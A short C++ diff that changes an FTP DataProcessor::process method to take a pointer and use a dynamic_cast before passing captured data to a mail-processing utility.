@@ -8,9 +8,9 @@
 namespace cs {
 namespace ftp {
 
-int DataProcessor::process(const cs::base::CollectedData &sniffer_data_arg) {
+int DataProcessor::process(cs::base::CollectedData* sniffer_data_ptr) {
 
-    const CollectedData &sniffer_data = (const CollectedData &) sniffer_data_arg;
+    CollectedData &sniffer_data = *(dynamic_cast<CollectedData*>(sniffer_data_ptr));
     util::mail_process(sniffer_data.get_data());
 
     return 1;
